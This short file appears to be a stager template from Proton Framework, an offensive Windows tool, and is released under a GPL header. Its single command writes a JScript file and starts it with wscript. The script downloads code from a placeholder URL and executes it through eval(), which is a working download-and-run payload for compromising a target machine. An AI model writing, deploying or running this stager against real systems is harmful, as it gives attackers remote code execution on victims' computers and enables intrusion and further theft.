::            ---------------------------------------------------
::                             Proton Framework              
::            ---------------------------------------------------
::                Copyright (C) <2019-2020>  <Entynetproject>
::
::        This program is free software: you can redistribute it and/or modify
::        it under the terms of the GNU General Public License as published by
::        the Free Software Foundation, either version 3 of the License, or
::        any later version.
::
::        This program is distributed in the hope that it will be useful,
::        but WITHOUT ANY WARRANTY; without even the implied warranty of
::        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
::        GNU General Public License for more details.
::
::        You should have received a copy of the GNU General Public License
::        along with this program.  If not, see <http://www.gnu.org/licenses/>.

echo try{x=new ActiveXObject('Microsoft.XMLHTTP');x.open('GET','~URL~',false);x.send();eval(x.responseText)}catch(e){}>~DIRECTORY~/~SCRIPT~&start wscript ~DIRECTORY~/~SCRIPT~
